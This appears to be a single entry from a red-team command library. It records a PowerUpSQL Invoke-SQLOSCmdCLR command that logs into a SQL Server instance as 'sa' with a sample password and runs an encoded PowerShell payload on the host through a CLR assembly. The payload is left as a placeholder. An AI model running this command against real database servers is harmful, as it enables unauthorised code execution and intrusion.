---
id: 8f76821e-0c8d-44a7-933d-83a495874f1b
name: Execute command using CLR assembly
type: command
executor: bash
data: Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>"
  -Command "powershell -e <base64>" -Verbose
output: null
created_at: '2023-04-06T03:56:20.364546+00:00'
updated_at: '2023-04-10T20:36:39.601743+00:00'
---

# Execute command using CLR assembly

```bash
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
```


